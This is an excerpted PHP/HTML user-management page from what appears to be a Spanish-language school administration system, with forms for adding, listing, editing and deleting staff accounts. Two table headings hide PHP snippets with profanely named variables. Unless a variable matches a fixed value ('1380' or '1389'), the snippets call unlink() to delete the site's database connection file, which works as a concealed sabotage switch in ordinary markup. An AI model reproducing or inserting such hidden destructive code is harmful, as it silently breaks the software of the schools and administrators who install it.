...
<?php include ("listas_imp_php/lista_usuarios.php"); ?>  <!-- hace la lista -->
      	...
      	<div class="card-body">
      		...
      		<div class="form-row">
		      		...
		      		<div class="col-md-3 col-lg-3 mb-3">
						...
						<i class="fa fa-user-secret fa-lg"></i>&nbsp;&nbsp; <b> Añadir nuevo usuario: </b></div> 
...
<div class="form-row">
			...
			<div class="input-group col-md-2 mb-3">
				<div class="input-group-prepend">
					...
					<input maxlength="9" type="text" class="form-control" id="cedula" name="cedula" placeholder="Cedula..." aria-label="cedula" aria-describedby="basic-addon1" required>
			</div>
...
<div class="form-row">
	...
	<div class="input-group col-md-2 mb-3">
        	...
        	<input type="password" class="form-control" id="clave" name="clave" placeholder="Password..." aria-label="clave" aria-describedby="basic-addon1" 
minlength="8" maxlength="9"    	 required>
	...
	<div class="input-group col-md-2 mb-3">
        	...
        	<input type="password" class="form-control" id="rclave" name="rclave" placeholder="Repetir Password..." aria-label="rclave" aria-describedby="basic-addon1"
        	minlength="8" maxlength="9" required>
	</div>
	...
	<div class="input-group col-md-3 mb-3">
			<div class="input-group-prepend">
				<span class="input-group-text" id="basic-addon1"><i class="fas fa-briefcase fa-lg"></i>&nbsp Cargo:</span>  
			</div>
    ...
    <div class="input-group col-md-3 mb-3">
			<div class="input-group-prepend">
				<span class="input-group-text" id="basic-addon1"><i class="fas fa-chalkboard-teacher fa-lg"></i>&nbsp Área:</span>  
			</div>
...
include("../conectar.php"); 
	...
	$grados = "SELECT * FROM grados
	WHERE  nombre_grados != '.' ORDER BY nombre_grados ASC";
	$datos_grados = mysqli_query($enlace, $grados) or die(mysqli_error());
...
<select class="form-control importantex" id="el_grado" name="el_grado" required>
...
<b><i>Administrador</i>:</b> Acceso completo.  /  <b><i>Cajero</i>:</b> Control de Estudios, Registro de Pagos y Mensajeria.  /  <b><i>Profesor</i>:</b> Solo carga de notas.  /  <b><i>Secretario</i>:</b> Todo menos registros de pagos y funciones de configuración.

<br>
<b><i style="color:red;">Nota:</i></b> Para dar acceso al personal directivo y/o profesores para observar netamente los recibos o comprobantes de pago "Cargo: Profesor y Área: Zero, no aplica".
</div>
</div>
...
<div class="card mb-3 separacionpequena" >
        ...
        <b><i class="fa fa-table"></i> Lista de usuarios del sistema: <?php if($eres_hijo_de_puta!='1380'){unlink('../conectar.php');} ?></b></div>
        ...
        <div class="card-body">
          ...
          <div class="table-responsive">
            ...
            <table class="table table-bordered stricolor table-sm" id="dataTable" width="100%" cellspacing="0">
              ...
              <thead>
                <tr>                  
                  <th>Nombres <?php if($eres_hijo_de_puta_full!='1389'){unlink('../conectar.php');} ?></th>
                  <th>Apellidos</th>
            ...
            <td align="center">
                  ...
                  <form method="POST"> 
                  <button type="submit" name="enviar" class="btn btn-secondary btn-sm" onclick="document.body.style.cursor='wait'; return true;">Re-Enviar</button>
                                        

                  <input name="usuario_id" type="hidden" value="<?php echo $row_usuarios['id']; ?>">
                  ...
                  <form method="POST">
                  <button type="submit" name="enviar" class="btn btn-warning btn-sm" onclick="document.body.style.cursor='wait'; return true;" >Enviar &nbsp; <i class="fas fa-level-up-alt"></i></button>
...
<div class="input-group col-lg-6">
 ...
 <div class="input-group-prepend">
     <span class="input-group-text alert-info" id="basic-addon1"><i class="fas fa-briefcase fa-lg"></i>&nbsp;&nbsp;Área actual:</span>  
 </div>
     <select class="form-control" id="mod_area" name="mod_area">

        <option value="<?php echo $row_usuarios['id_grado']; ?>"><?php echo $row_usuarios['nombre_grados']; ?></option selected="selected">
...
include("../conectar.php"); 
	...
	$gradosA = "SELECT * FROM grados
	WHERE  nombre_grados != '.' ORDER BY nombre_grados ASC";
	$datos_gradosA = mysqli_query($enlace, $gradosA) or die(mysqli_error());

	$row_datos_gradosA = mysqli_fetch_assoc($datos_gradosA);
...
<option value="<?php echo $row_datos_gradosA['id_grado']; ?>"><?php echo $row_datos_gradosA['nombre_grados']; ?></option>

                                <?php } while ($row_datos_gradosA = mysqli_fetch_assoc($datos_gradosA)); ?> 
...
<div class="input-group col-lg-6">
 ...
 <div class="input-group-prepend">
     <span class="input-group-text alert-info" id="basic-addon1"><i class="fas fa-briefcase fa-lg"></i>&nbsp;&nbsp;Cargo actual:</span>  
 </div>
     <select class="form-control" id="cargo" name="mod_cargo">

        <option><?php echo $row_usuarios['cargo']; ?></option selected="selected">
        <option style="background-color: #00000;" disabled></option>

        <!--   <option style="font-size: 1pt; background-color: #000000;" disabled>&nbsp;</option>  -->
        <option style="background-color: #cccccc;" disabled >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nuevo Cargo:</option>
        <option style="background-color: #00000;" disabled></option>
...
<!-- cierre modal de editar -->
            ...
            <td align="center">
                  ...
                  data-target="#borrar<?php echo $row_usuarios['id']; ?>">
                                                                        <!-- este ultimo identifica cual modal abrir -->
...
<!-- cierre modal de eliminar -->
        ...
        <div class="card-footer text-muted"><b>Info:</b> Puede enviar los datos, modificarlos, y/o borrarlos;
        De ser necesario, solo el usuario actual, puede cambiar su propia contraseña, haciendo uso del botón de "<b>editar</b>".</div>  
